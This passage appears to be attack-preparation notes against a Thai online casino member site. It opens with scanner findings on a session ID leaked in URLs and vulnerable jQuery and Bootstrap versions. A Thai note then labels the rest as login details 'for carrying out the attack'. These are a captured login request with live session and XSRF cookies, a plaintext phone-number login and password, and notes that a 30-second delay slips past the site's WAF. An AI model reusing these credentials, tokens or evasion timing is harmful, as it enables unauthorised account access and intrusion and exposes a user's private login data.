URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754286423926&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AAAAAAQ&_s=1&sid=1754286375&sct=5&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Frefunds&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=page_view&_ee=1&tfd=53825
Method	POST
Parameter	sid
Attack	
Evidence	1754286375
Other Info	
URL	https://www.google-analytics.com/g/collect?v=2&tid=G-STHQJCL0VP&gtm=45je57u1v9171603508za200zd9171603508&_p=1754286423926&gcd=13l3l3l3l1l1&npa=0&dma=0&tag_exp=101509157~103116026~103200004~103233427~104684208~104684211~104948813~105087538~105087540~105103161~105103163&cid=762325145.1754274190&ul=en-us&sr=1536x864&uaa=x86&uab=64&uafvl=Not)A%253BBrand%3B8.0.0.0%7CChromium%3B138.0.7204.184%7CGoogle%2520Chrome%3B138.0.7204.184&uamb=0&uam=&uap=Windows&uapv=19.0.0&uaw=0&are=1&frm=0&pscdl=noapi&_eu=AEAAAAQ&_s=2&sid=1754286375&sct=5&seg=1&dl=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Frefunds&dr=https%3A%2F%2Fmember.panama8888b.com%2Fuser%2Fdashboard%3Fline_id%3D%2540vippnm888%26tg_id%3Dpanama888v&dt=PANAMA888%20%E0%B8%A8%E0%B8%B9%E0%B8%99%E0%B8%A2%E0%B9%8C%E0%B8%A3%E0%B8%A7%E0%B8%A1%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B1%E0%B9%88%E0%B8%A7%E0%B9%82%E0%B8%A5%E0%B8%81%20%E0%B8%84%E0%B8%A3%E0%B8%9A%E0%B8%97%E0%B8%B8%E0%B8%81%E0%B8%84%E0%B9%88%E0%B8%B2%E0%B8%A2%E0%B9%83%E0%B8%99%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%80%E0%B8%94%E0%B8%B5%E0%B8%A2%E0%B8%A7%20(%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AA%E0%B8%94%20%E0%B8%AA%E0%B8%A5%E0%B9%87%E0%B8%AD%E0%B8%95%20%E0%B8%A2%E0%B8%B4%E0%B8%87%E0%B8%9B%E0%B8%A5%E0%B8%B2%20%E0%B8%9A%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%A3%E0%B9%88%E0%B8%B2%20%E0%B9%81%E0%B8%97%E0%B8%87%E0%B8%9A%E0%B8%AD%E0%B8%A5%20%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%81%E0%B8%B5%E0%B8%AC%E0%B8%B2%20%E0%B8%AB%E0%B8%A7%E0%B8%A2)&en=scroll&epn.percent_scrolled=90&_et=3339&tfd=58837
Method	POST
Parameter	sid
Attack	
Evidence	1754286375
Other Info	
Instances	56
Solution	
For secure content, put session ID in a cookie. To be even more secure consider using a combination of cookie and URL rewrite.
Reference	https://seclists.org/webappsec/2002/q4/111
CWE Id	598
WASC Id	13
Plugin Id	3
Medium
Vulnerable JS Library
Description	
The identified library appears to be vulnerable.
URL	https://code.jquery.com/jquery-3.2.1.slim.min.js
Method	GET
Parameter	
Attack	
Evidence	jquery-3.2.1.slim.min.js
Other Info	The identified library jquery, version 3.2.1.slim is vulnerable. CVE-2020-11023 CVE-2020-11022 CVE-2019-11358 https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/ https://nvd.nist.gov/vuln/detail/CVE-2019-11358 https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/
URL	https://member.panama8888b.com/public/js/bootstrap.min.js
Method	GET
Parameter	
Attack	
Evidence	* Bootstrap v4.0.0
Other Info	The identified library bootstrap, version 4.0.0 is vulnerable. CVE-2018-14041 CVE-2019-8331 CVE-2018-14040 CVE-2018-14042 CVE-2024-6531 https://github.com/twbs/bootstrap/issues/28236 https://github.com/advisories/GHSA-pj7m-g53m-7638 https://www.herodevs.com/vulnerability-directory/cve-2024-6531 https://github.com/twbs/bootstrap/issues/20184 https://github.com/advisories/GHSA-vc8w-jr9v-vj7f https://nvd.nist.gov/vuln/detail/CVE-2024-6531 https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6531.yml https://github.com/twbs/bootstrap https://github.com/advisories/GHSA-9v3m-8fp8-mj99
Instances	2
Solution	
Upgrade to the latest version of the affected library.
Reference	https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
CWE Id	1395
WASC Id	
Plugin Id	10003 









******
นี่คือ รายละเอียดสำหรับ ใช้สำหรับ login เพื่อทำการโจมตี 
Request URL
https://member.panama8888b.co/auth/login
Request method
POST
Status code
302 Found
Remote address
[2606:4700:3034::ac43:93a7]:443
Referrer policy
strict-origin-when-cross-origin
alt-svc
h3=":443"; ma=86400
cache-control
no-cache, private
cf-cache-status
DYNAMIC
cf-ray
96a89305ca2fd017-BKK
content-type
text/html; charset=UTF-8
date
Tue, 05 Aug 2025 19:06:53 GMT
location
http://member.panama8888b.co/auth/login
nel
{"success_fraction":0,"report_to":"cf-nel","max_age":604800}
report-to
{"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=BrkgkHhTMNBR8lonfGQDrvAXYZGG9WPikafAj1JO6vthrSk0w1GimIqWVJAvqCINMYEtnErnJsxSVWnerEBC%2BC0t%2FlT3llXrHjgXwCrJ3BzwNL30w6BAGyXzdjgx2i0IDhlHfjIrm%2FnYOtBAHDbcXHCf5%2FQ%3D"}],"group":"cf-nel","max_age":604800}
server
cloudflare
server-timing
cfL4;desc="?proto=QUIC&rtt=50680&min_rtt=33700&rtt_var=7331&sent=1452&recv=264&lost=18&retrans=18&sent_bytes=1656259&recv_bytes=36815&delivery_rate=11881081&ss_exit_cwnd=98184&ss_exit_reason=2&cwnd=1021979&unsent_bytes=0&cid=849378a6060bd058&ts=45446&inflight_dur=1861&x=103"
set-cookie
XSRF-TOKEN=eyJpdiI6IjlQRnpqQ0lnZk5pZG02YVwvSEFRU21RPT0iLCJ2YWx1ZSI6InpSRGZvTnl4VkJlNzNZTXhFSlZJeVlmTjAxdFNmZ0lnbmZGYUJzaVVZK3BwWWs3b2tQeEs5WERzdWVMQVRiQ24iLCJtYWMiOiJlMDI0NDQ5OTRjNTNiOWRlZmUwYzAzN2U2MGU0Zjc2YmYwZThmMTA2Mjk2MzlmMDQwYzJhNDJlMjRmZDZiMzVkIn0%3D; expires=Tue, 05-Aug-2025 21:06:53 GMT; Max-Age=7200; path=/
set-cookie
panama888_session=eyJpdiI6IkNpVjZreU9yRDFZVmJ5SUpVdjN2dWc9PSIsInZhbHVlIjoiSERUeGxyd3ozRmNpSWR0bUk3NENTNmwwQTRPM2N2ekdhOTB6N2ZpODlmK3JrRmtKWDNSRmJrdzVSM1EwaUtRVSIsIm1hYyI6ImMyMzQ2Mjk1ZDliZTI4OWQ5OWVhNmJkMTY4NDIyOWY4YWFjMDIyNjM5NDdmZjU5ZjAwMGMxOTdjY2UwZWQ4NjMifQ%3D%3D; expires=Tue, 05-Aug-2025 21:06:53 GMT; Max-Age=7200; path=/; httponly
:authority
member.panama8888b.co
:method
POST
:path
/auth/login
:scheme
https
accept
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
accept-encoding
gzip, deflate, br, zstd
accept-language
th
cache-control
max-age=0
content-length
80
content-type
application/x-www-form-urlencoded
cookie
route=b2e55197930d344b07b2a75549051d09; _ga=GA1.1.997340294.1754420689; XSRF-TOKEN=eyJpdiI6IlZmcEMzdldxMklscWRnVUVWaDdBcEE9PSIsInZhbHVlIjoiY1cxSGhnUHVUb3VhT2Izb0VzdjZSbkN3Uzg4ZnZldGw4NXRseGwyQ20xUXhJbXVsZGxYbnZMbG42SVdzVEtoZCIsIm1hYyI6ImQ2Mjk2OTUwNzIwNmQwOTExOWQ4ZDFjZjUyMDdjYjJmYTIzYzBlZmIwOWUyMGM1MjQ5OTQwOWM0NjllN2U1MzEifQ%3D%3D; panama888_session=eyJpdiI6IkoxNHd2VHl3eUh1QlwvWFNJRW9kaHRBPT0iLCJ2YWx1ZSI6ImNaQWd3QnFtMUNmbnlUb2tFNm11M2t2YzNSOUViSFFZQXVjVFRCcEZObmJWbGk4OHRFSTNTdnRoQkNJNmJsM2UiLCJtYWMiOiJiYTA4MmIwNDE3MGRhNDBlMmYyNmYzYzA1NzEzMjAwNzZiOTQ2YmNjOTc0ODI3ZThiZTI3NzRiMzMxZjY5MDM0In0%3D; _ga_STHQJCL0VP=GS2.1.s1754420689$o1$g1$t1754420812$j14$l0$h0
origin
https://member.panama8888b.co
priority
u=0, i
referer
https://member.panama8888b.co/auth/login
sec-ch-ua
"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
sec-ch-ua-mobile
?0
sec-ch-ua-platform
"Windows"
sec-fetch-dest
document
sec-fetch-mode
navigate
sec-fetch-site
same-origin
sec-fetch-user
?1
upgrade-insecure-requests
1
user-agent
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36


_token" type="hidden" value="rlC1MnZOVyG6OHUfM3oemoFW7u3WPeq7jUQoMWWJ"
Login:0630471054
Password:laline1812


WAF มีการตรวจจับ ไห้ login ตามนี้ 
จากการทดสอบเบื้องต้น 30วินาทีดีเลย์จะตรวจจับไม่เจอ
**WAF มีความจำสั้นจับได้แค่ครั้งเดียวและครั้งกต่อไปลืม
